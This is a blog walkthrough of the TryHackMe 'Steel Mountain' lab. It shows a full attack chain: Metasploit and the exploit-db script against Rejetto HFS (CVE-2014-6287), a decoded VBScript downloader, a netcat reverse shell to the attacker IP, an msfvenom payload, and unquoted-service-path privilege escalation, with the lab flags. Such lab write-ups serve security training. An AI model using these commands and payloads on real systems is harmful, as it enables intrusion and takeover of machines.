---
layout: post
title:  "TryHackMe: Steel Mountain"
date: 2021-09-17 17:50:00 -0500
tags: tryhackme security
---
Even though this is an easy room and everything is kind of spelled out, it's nice to still have some notes about new things

## Background
- Link: https://tryhackme.com/room/steelmountain
- Attacker IP: 10.6.49.162
- Target IP: 10.10.225.45

## Introduction
Once we deploy the machine, we can just pop <code>10.10.225.45</code> into Firefox and see what happens

### Questions
- Who is the employee of the month?
    - For this, we can just do a view image info on the image, or do a reverse image search. But if you're a fan of Mr. Robot, you'll probably recognize him pretty quick

## Initial Access
We can do a quick <code>nmap</code> scan to see what ports are available and if anything is also helpful:
```
ubuntu@kali:~$ nmap -A -vv 10.10.225.45
Not shown: 988 closed ports
Reason: 988 conn-refused
PORT STATE SERVICE  REASON  VERSION
80/tcp    open  http     syn-ack Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc    syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack
8080/tcp  open  http     syn-ack HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

Open ports:
- 80
- 135
- 139
- 445
- 3389
- 8080

Looks like there are two web servers at port 80 and port 8080

### Metasploit

Based on the questions, looks like we're going to use metasploit to use that CVE and get an initial foothold:
<ol style="list-style:number">
<li>Run <code>msfconsole</code></li>
<li>Search for the module <code>search cve-2014-6287</code>
<pre>
msf6 > search cve-2014-6287

Matching Modules
================

   #  Name     Disclosure Date  Rank  Check  Description
   -  ----     ---------------  ----  -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11  excellent  Yes    Rejetto HttpFileServer Remote Command Execution
</pre></li>
<li>We'll use the only module that pops up <code>use 0</code></li>
<li>Use the <code>info</code> command to see what parameters are required. Looks like our main ones are RHOSTS and RPORT, so we'll set those</li>
<li><code>set RHOSTS 10.10.225.45</code></li>
<li><code>set RPORT 8080</code></li>
<li> <code>run</code>

Hopefully we get the results:

<pre>
msf5 > search cve-2014-6287

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.225.45
RHOSTS => 10.10.225.45
msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.94.75:4444 
[*] Using URL: http://0.0.0.0:8080/xzAZ6wLUlAo
[*] Local IP: http://10.10.94.75:8080/xzAZ6wLUlAo
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /xzAZ6wLUlAo
[*] Sending stage (176195 bytes) to 10.10.225.45
[*] Meterpreter session 1 opened (10.10.94.75:4444 -> 10.10.225.45:49221) at 2021-09-19 02:53:09 +0100
[!] Tried to delete %TEMP%\FwBihNrTuxbiwK.vbs, unknown result
[*] Server stopped.

meterpreter > 
</pre>
We will need to navigate to find the user flag</li>
<li> <code>cd /Users/bill/Desktop</code></li>
<li> <code>cat user.txt</code>
<pre>
meterpreter > cd /Users/bill/Desktop
meterpreter > cat user.txt
\ufffd\ufffdb04763b6fcf51fcd7c13abc7db4fd365
meterpreter > 
</pre></li>
</ol>

### Questions
- Scan the machine with nmap. What is the other port running a web server on?
    - 8080
- Take a look at the other web server. What file server is running?
    - When we go to <code>10.10.74.238:8080</code>, it looks like some sort of upload page. On the lower-left hand-side, we see something that looks like it gives server information, and when we hover over the link, it brings us to another site
    - Looks like this is running something called <code>Rejetto HTTPFileServer 2.3</code>
- What is the CVE number to exploit this file server?
    - Just a quick duckduckgo search using the value "Rejetto HTTPFileServer 2.3" gives us https://www.exploit-db.com/exploits/39161, which points to <code>CVE-2014-6287</code>
- Use Metasploit to get an initial shell. What is the user flag?
    - <code>db04763b6fcf51fcd7c13abc7db4fd365</code>

## Privilege Escalation (with Metasploit)
Here, we will use PowerUp, available at https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
<ol style="list-style:number">
<li>In the attacker machine, create another terminal (preferably in the same directory that you are running metasploit), and copy and paste the script into a new file called PowerUp.ps1. Or, we can use <code>wget</code> to pull in the raw file (which we can obtain when we go to https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 and click Raw)
<pre>
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
</pre></li>
<li> Switch back to the metasploit terminal and upload
<pre>
meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 1.91 MiB of 1.91 MiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
meterpreter > 
</pre></li>
<li> We will then load the powershell extension into the meterpreter and run the script, and then Invoke-AllChecks:
<pre>
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

---

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path &lt;HijackPath&gt;
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

---

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
</pre>
</li>
<li>Since we can restart the service AdvancedSystemCareService9 and it has unquoted service paths, we will create a payload with <code>msfvenom</code>, upload it, move it over to the directory with unquoted service paths and then restart the service. In our attacker machine, we will open up another terminal window and create the payload:
<pre>
ubuntu@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.49.162 LPORT=4444 -e x86/shikata_ga_nai -f exe -o Advanced.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: Advanced.exe
ubuntu@kali:~# 
</pre></li>

<li> Then in the meterpreter, we will upload this file, move it to <code>C:\Program Files (x86)\IObit\</code>
<pre>
PS > ^C
Terminate channel 3? [y/N]  y
meterpreter > upload Advanced.exe
[*] uploading  : Advanced.exe -> Advanced.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): Advanced.exe -> Advanced.exe
[*] uploaded   : Advanced.exe -> Advanced.exe
meterpreter > powershell_shell
PS > copy "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe" "C:\Program Files (x86)\IObit"

</pre></li>
<li>We're create one more terminal tab to set up netcat to listen for our payload <code>nc -lvnp 4444</code></li>
<li>Back in the meterpreter, we're going to restart the service AdvancedSystemCareService9 and hope for the best
<pre>
PS > Restart-Service AdvancedSystemCareService9 
</pre></li>
<li> Hopefully we get the output on our netcat seeion
<pre>
root@ip-10-10-94-75:~# nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.109.126 49297 received!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
</pre>
</li>

<li>We'll first find root.txt and then print out its contents
<pre>
C:\Windows\system32>cd\  
cd\

C:\>dir /s root.txt
dir /s root.txt
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\Administrator\Desktop

09/27/2019  05:41 AM                32 root.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  44,153,004,032 bytes free

C:\>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db8
C:\Users\Administrator\Desktop>
</pre>
</li>
</ol>


### Questions
- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
    - AdvancedSystemCareService9
- What is the root flag?
    - 9af5f314f57607c00fd09803a587db8

## Access and Escalation Without Metasploit 

### Initial foothold
This one is probably the most fun. We'll do some preliminary steps first:
<ol style="list-style:decimal">
<li>Get netcat static binary: https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe and rename it to nc.exe (we're renaming this because the exploit we're going to use is expecting this file name)</li>
    - Put this in a folder (let's say ~/Desktop/nc)
<li>Get the python script at https://www.exploit-db.com/exploits/39161 and we'll randomly name it as <code>exploit.py</code></li>
    - Modify the variable <code>ip_addr</code> to be the attacking system's IP address (10.6.49.162)
    - Modify the <code>local_port</code> variable to the port number where we're going to listen via netcat, let's just do 8888 in this example
<li>We're going to need 3 separate terminals</li>
    - In one terminal, we'll set up : 
   - <code>cd ~/Desktop/nc</code> (which contains our <code>nc.exe</code>) 
   <code>sudo python3 -m http.server 80</code> (we need to specify port 80 since the python script is specifically looking at port 80, which also means we'll need <code>sudo</code>, since this is a privileged port)
   - We will use the web server to pass things back and forth between the attacking machine and target machine
    - In the 2nd terminal, we'll set up a netcat listener:
   - <code>nc -lvnp 8888</code>
    - 3rd terminal, we'll use to run the python scripts and move things back and forth. For right now, we'll run the python script a few times. The first time will be 
   - <code>python exploit.py</code>
<li>Once we run the python script 2 or more times, we should hopefully see the following on our netcat listener:
<pre>
ubuntu@kali:~$ nc -lvnp 8888
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.225.45.
Ncat: Connection from 10.10.225.45:49265.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
</pre></li>
</ol>

### What is the script actually doing
[CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287) mentions remote code execution when we add in a `%00` sequence in the search action. So if we take a look at the script (https://www.exploit-db.com/exploits/39161), it's using the crafted url:
```
http://[ip address]:[port]/?search=%00{.[some windows command].}
Example: http://10.10.74.238:8080/?search=%00{.dir.}
```
The example above will go into our target web server at port 8080 and run the CMD command <code>dir</code> (although we're not going to get any feedback saying that we've run it successfully). Okay, what else could run?

Looks like there are three commands it's running, it all just looks super jumbled because it's percent-encoded (or URL encoded). If we decode all of it and glue everything together, we get three commands:
```
save:
save|C:\\Users\\Public\\script.vbs|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "http://10.6.49.162/nc.exe", False
xHttp.Send

with bStrm\r
    .type = 1 \'//binary
    .open
    .write xHttp.responseBody
    .savetofile "C:\\Users\\Public\\nc.exe", 2 \'//overwrite
end with

exe:
exec|cscript.exe C:\\Users\\Public\\script.vbs

exe1:
exec|C:\Users\Public\nc.exe -e cmd.exe 10.6.49.162 8888
```

Looks like it's creating a VB script that pulls in from our python webserver <code>nc.exe</code> and saving it to <code>C:\Users\Public\nc.exe</code>, running the actual script, and then running netcat to hit our netcat listener

### Privilege escalation
Now that we're in, we can work on privilege escalation. The room mentions that we should move over winPEAS
<ol style="list-style:decimal">
<li>Back in our 3rd terminal which just ran the python script, let's download winPEAS https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASbat/winPEAS.bat and put it back into the <code>~/Desktop/nc</code> directory so it's available on the web server</li>

<li>In our target machine, it looks like we can run powershell commands. The main command we'll be using is <code>powershell -c [command]</code>. The main cmdlet we'll abuse is <code>Invoke-WebRequest</code>. We'll obtain the <code>winPEAS.bat</code> file by the command:
<pre>
powershell -c Invoke-WebRequest -OutFile winPEAS.bat -URi http://10.6.49.162/winPEAS.bat
</pre>
</li>

<li>We'll now run winPEAS.bat
<pre>
 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS   
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services    
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe STEELMOUNTAIN\bill:(I)(RX,W)
C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Program Files\Amazon\XenTools\LiteAgent.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe NT AUTHORITY\SYSTEM:(I)(F)
C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe STEELMOUNTAIN\bill:(I)(RX,W)
C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe STEELMOUNTAIN\bill:(I)(RX,W)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)
C:\Windows\SysWow64\perfhost.exe NT SERVICE\TrustedInstaller:(F)
C:\Windows\PSSDNSVC.EXE NT AUTHORITY\SYSTEM:(I)(F)
C:\Windows\servicing\TrustedInstaller.exe NT SERVICE\TrustedInstaller:(F)
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

---  
Scan complete. 
     
 [+] UNQUOTED SERVICE PATHS   
   [i] When the path is not quoted (ex: C:\Program files\soft\new folder\exec.exe) Windows will try to execute first 'C:\Program.exe', then 'C:\Program Files\soft\new.exe' and finally 'C:\Program Files\soft\new folder\exec.exe'. Try to create 'C:\Program Files\soft\new.exe' 
   [i] The permissions are also checked and filtered using icacls     
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services    
AdvancedSystemCareService9    
 C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe 
AWSLiteAgent   
 C:\Program Files\Amazon\XenTools\LiteAgent.exe   
IObitUnSvr     
 C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe    
LiveUpdateSvc  
 C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe     
NetTcpPortSharing   
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe   
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe NT SERVICE\TrustedInstaller:(F)  
</pre>

The unquoted service paths is its own set of vulnerabilities and the script output gives a good example:
<pre>
C:\Program files\soft\new folder\exec.exe

Windows will try to execute 
- First 'C:\Program.exe'
- Then 'C:\Program Files\soft\new.exe' 
- Finally 'C:\Program Files\soft\new folder\exec.exe'
Try to create 'C:\Program Files\soft\new.exe' 
</pre>
Sample article: https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae

The path we will target is <code>C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</code> and create: <code>C:\Program Files (x86)\IObit\Advanced.exe</code>
</li>

<li> We'll generate our payload with <code>msfvenom</code> on our attacking machine:
<pre>
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.49.162 LPORT=4444 -e x86/shikata_ga_nai -f exe -o Advanced.exe
</pre></li>

<li>Next, move Advanced.exe to <code>~/Desktop/nc</code> and we'll use the same strategy to move it to the target machine
<pre>
mv Advanced.exe ~/Desktop/nc
</pre>
</li>
<li>On the target machine, run 
<pre>
powershell -c Invoke-WebRequest -OutFile Advanced.exe -URi http://10.6.49.162/Advanced.exe
</pre>
</li>
<li>On our attacking machine, let's create a new terminal tab and set up another netcat listener

<pre>
nc -lvnp 4444
</pre></li>

<li>On the target machine, we'll move <code>Advanced.exe</code> over to <code>C:\Program Files (x86)\IObit</code>
<pre>
copy Advanced.exe "C:\Program Files (x86)\IObit\"
</pre>
</li>

<li>Finally we'll stop and then restart the service <code>AdvancedSystemCareService9</code>, which will hopefully run our payload as administrator:
<pre>
C:\Users\Public>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\Public>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
</pre>

And hopefully on our attacking machine we see:

<pre>
ubuntu@kali:~$ nc -lvnp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.225.45.
Ncat: Connection from 10.10.225.45:49349.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
</pre>
</li>
</ol>

### Questions
- What powershell -c command could we run to manually find out the service name?
    - <code>powershell -c "Get-Service"</code>